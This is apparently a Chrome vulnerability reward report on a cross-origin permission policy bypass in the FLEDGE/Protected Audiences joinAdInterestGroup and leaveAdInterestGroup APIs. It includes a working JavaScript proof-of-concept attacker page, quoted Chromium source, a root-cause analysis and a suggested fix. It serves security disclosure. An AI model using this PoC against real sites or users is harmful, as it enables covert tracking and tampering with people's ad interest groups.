# VRP Report: FLEDGE/Protected Audiences Cross-Origin Interest Group Permission Policy Bypass

## Title

FLEDGE joinAdInterestGroup() bypasses cross-origin owner permission policy check — feature flag disabled

## Severity

Medium (Privacy Sandbox security model violation)

## Component

Blink > InterestGroups

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions with Protected Audiences support.

## Summary

The cross-origin permission policy check for `joinAdInterestGroup()` / `leaveAdInterestGroup()` is implemented but gated behind `kFledgeModifyInterestGroupPolicyCheckOnOwner`, which is **DISABLED_BY_DEFAULT**. When a page calls these APIs with a cross-origin `owner`, the browser detects the permission policy violation (logs a WebFeature metric) but allows the operation to proceed.

Additionally, at 4 separate Mojo IPC entry points, browser-renderer permission policy inconsistencies are silently ignored instead of calling `ReportBadMessageAndDeleteThis()` (crbug.com/382786767).

## Steps to Reproduce

### 1. Set up an ad-network origin with restrictive permission policy

At `https://ad-network.example/page.html`:
```html
<!-- This page has default permission policy: join-ad-interest-group=(self) -->
<!DOCTYPE html>
<html>
<body>
<p>Ad network page - only this origin should be able to manage its interest groups</p>
</body>
</html>
```

### 2. Attacker page at different origin

At `https://evil.example/attack.html`:
```html
<!DOCTYPE html>
<html>
<body>
<script>
// This page is NOT same-origin with ad-network.example
// The default permission policy for join-ad-interest-group is (self),
// meaning only ad-network.example should be able to manage its groups.

async function addToTrackingGroup() {
  try {
    // Join an interest group owned by ad-network.example
    // from evil.example — should be blocked by permission policy
    await navigator.joinAdInterestGroup({
      owner: 'https://ad-network.example',
      name: 'evil-tracking-group',
      biddingLogicUrl: 'https://ad-network.example/bid.js',
      ads: [{renderUrl: 'https://evil.example/ad.html'}]
    }, 30 * 24 * 3600 * 1000);  // 30 days

    console.log('Successfully joined — permission policy bypassed!');
  } catch (e) {
    console.log('Blocked:', e);
  }
}

async function removeFromGroups() {
  // Can also remove users from interest groups
  await navigator.leaveAdInterestGroup({
    owner: 'https://ad-network.example',
    name: 'legitimate-retargeting-group'
  });
  console.log('Left group — manipulation successful');
}

addToTrackingGroup();
</script>
</body>
</html>
```

### Expected Result

The `joinAdInterestGroup()` call should fail because:
- `evil.example` is cross-origin from `ad-network.example`
- The default permission policy for `join-ad-interest-group` is `(self)`
- `ad-network.example` has not delegated this permission to `evil.example`

### Actual Result

The call succeeds because the permission policy enforcement is gated behind a disabled feature flag:

```cpp
// ad_auction_service_impl.cc:870-882
if (!permissions_policy->IsFeatureEnabledForOrigin(
        kJoinAdInterestGroup, owner,
        /*override_default_policy_to_all=*/true)) {
  // Violation DETECTED — logged as WebFeature metric
  GetContentClient()->browser()->LogWebFeatureForCurrentPage(...);

  // But only BLOCKED if flag is enabled (it's not)
  if (base::FeatureList::IsEnabled(
          features::kFledgeModifyInterestGroupPolicyCheckOnOwner)) {
    return false;  // DEAD CODE in production
  }
}
return true;  // Operation proceeds despite policy violation
```

## Root Cause Analysis

### 1. Feature-gated enforcement (ad_auction_service_impl.cc:878-881)

```cpp
if (base::FeatureList::IsEnabled(
        features::kFledgeModifyInterestGroupPolicyCheckOnOwner)) {
  return false;
}
```

The feature flag `kFledgeModifyInterestGroupPolicyCheckOnOwner` is defined with `FEATURE_DISABLED_BY_DEFAULT` in `interest_group_features.cc`. Until this flag is enabled by default, the cross-origin owner permission policy check is detection-only — it logs a metric but does not block the operation.

### 2. Missing renderer kill at 4 IPC entry points (crbug.com/382786767)

At lines 379, 416, 613, and 856 of `ad_auction_service_impl.cc`:
```cpp
// TODO(https://crbug.com/382786767): Figure out why permission policy can
// be inconsistent between the browser and renderer policy, fix it, and then
// call ReportBadMessageAndDeleteThis() here.
```

When the browser-side permissions policy check fails, the renderer is not killed. This means a compromised renderer that ignores permission policy restrictions will have its IPC calls silently dropped rather than triggering a renderer termination.

## Security Impact

### 1. Unauthorized interest group manipulation

Any page can join or leave interest groups for any cross-origin owner, regardless of permission policy. This allows:
- Adding users to arbitrary interest groups (user tracking)
- Removing users from legitimate interest groups (ad revenue disruption)
- Manipulating bidding logic URLs for existing groups

### 2. Privacy implications

Interest groups are a core Privacy Sandbox primitive. The ability to manipulate them cross-origin without consent undermines the trust model of Protected Audiences auctions.

### 3. No compromised renderer required

This is exploitable via standard JavaScript API calls from any page. No special privileges or renderer compromise needed.

## Suggested Fix

1. Enable `kFledgeModifyInterestGroupPolicyCheckOnOwner` by default
2. Add `ReportBadMessageAndDeleteThis()` at all 4 IPC entry points (crbug.com/382786767)
3. Consider adding a dedicated permission policy feature for cross-origin interest group management

## PoC

Inline above. The key observation is that `navigator.joinAdInterestGroup({owner: 'https://cross-origin.example', ...})` succeeds from any origin, bypassing the permission policy that should restrict interest group management to the owning origin.
